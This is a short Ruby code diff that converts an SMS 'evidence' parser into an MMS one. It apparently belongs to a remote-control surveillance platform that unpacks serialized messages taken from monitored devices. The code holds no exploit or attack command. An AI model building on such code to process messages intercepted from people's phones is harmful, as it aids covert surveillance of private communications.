@@ -2,7 +2,7 @@ require_relative 'common'
 require 'rcs-common/serializer'
 
 module RCS
-  module SmsEvidence
+  module MmsEvidence
     def content
       raise "Not implemented!"
     end
@@ -15,17 +15,19 @@ module RCS
 
       info =  Hash[common_info]
       info[:data] ||= Hash.new
-      info[:data][:type] = :sms
+      info[:data][:type] = :mms
 
       stream = StringIO.new chunks.join
-      @sms = MAPISerializer.new.unserialize stream
+      @mms = MAPISerializer.new.unserialize stream
 
-      info[:data][:from] = @sms.fields[:from]
-      info[:data][:rcpt] = @sms.fields[:rcpt]
-      info[:data][:content] = @sms.fields[:subject]
+      info[:data][:from] = @mms.fields[:from]
+      info[:data][:rcpt] = @mms.fields[:rcpt]
+
+      info[:data][:subject] = @mms.fields[:subject]
+      info[:data][:content] = @mms.fields[:text_body]
 
       yield info if block_given?
       :keep_raw
     end
-  end # ::CalendarEvidence
+  end # ::MmsEvidence
 end # ::RCS
